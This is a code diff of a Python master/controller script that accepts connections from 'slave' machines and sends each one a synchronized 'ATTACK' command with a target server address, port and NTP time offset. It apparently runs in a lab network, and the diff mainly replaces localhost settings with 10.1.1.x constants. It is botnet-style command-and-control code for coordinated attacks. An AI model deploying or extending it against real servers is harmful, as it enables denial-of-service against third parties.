@@ -2,6 +2,12 @@ import time, datetime, sys, re,ntplib
 from socket import *  #importing the socket library for network connections
 from time import ctime
 
+##Setting up variables
+SERVER_HOST = '10.1.1.50'
+SERVER_PORT = 8080
+MS_LISTEN_HOST = '10.1.1.250'
+MS_LISTEN_PORT = 8081
+
 class Master():
   def __init__(self, sock=None):
     if sock is None:
@@ -11,16 +17,16 @@ class Master():
     self.slaves = {}
 
     # The server to be attacked
-    self.server_ip = 'localhost'
-    self.server_port = 8080
+    self.server_ip = SERVER_HOST
+    self.server_port = SERVER_PORT
 
     # get ntp times
     self.ntpc = ntplib.NTPClient()
-    self.ntp_res = self.ntpc.request('europe.pool.ntp.org', version=3)
+    self.ntp_res = self.ntpc.request('10.1.1.50', version=3)
 
   def listenConnections(self, port):
     print "Listening for connections"
-    self.sock.bind(('localhost', port))
+    self.sock.bind((MS_LISTEN_HOST, port))
     self.sock.listen(3)
 
   def acceptConnections(self):
@@ -36,15 +42,15 @@ class Master():
   def launchAttack(self):
     # get ntp times
     ntpc = ntplib.NTPClient()
-    ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
     for slave_addr, conn in self.slaves.iteritems():
+      ntp_res = ntpc.request('10.1.1.50', version=3)
       conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res.offset))
 
   def closeConnection(self):
     self.sock.close()
 
 if __name__ == '__main__':
-    port = 8081
+    port = MS_LISTEN_PORT
     masterServer = Master()
     masterServer.listenConnections(port)
     while 1:
